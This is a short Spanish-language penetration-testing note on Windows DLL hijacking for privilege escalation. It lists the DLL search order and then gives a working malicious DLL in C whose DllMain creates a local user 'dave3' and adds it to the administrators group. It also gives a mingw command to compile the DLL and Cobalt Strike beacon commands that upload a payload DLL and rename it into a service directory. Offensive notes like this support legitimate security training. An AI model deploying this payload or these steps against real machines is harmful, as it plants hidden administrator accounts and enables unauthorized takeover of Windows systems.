---
tags: [privesc, windows, dll]
---

# DLL Hijacking

Ocurre cuando un atacante deposita una DLL maliciosa en un directorio que se busca antes que el legítimo.

## Orden de Búsqueda de DLLs

1. Directorio de ejecución del proceso
2. `C:\Windows\System32`
3. Directorio System de 16 bits
4. `C:\Windows`
5. Directorio de trabajo actual
6. Directorios en `PATH`

> [!tip]
> Si sospechas DLL hijack y necesitas revisar manualmente, recrea el entorno exacto en tu Windows — si el ejecutable se lanza con una tarea o servicio, créalo tal cual.

## Payload — Crear Usuario

```c
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(HANDLE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
        system("net user dave3 password123! /add");
        system("net localgroup administrators dave3 /add");
        break;
    }
    return TRUE;
}
```

## Compilar

```bash
x86_64-w64-mingw32-gcc TextShaping.cpp --shared -o TextShaping.dll
```

## Desde Cobalt Strike

```bash
beacon> cd "C:\Program Files\Bad Windows Service\Service Executable"
beacon> upload C:\Payloads\dns_x64.dll
beacon> mv dns_x64.dll BadDll.dll
```

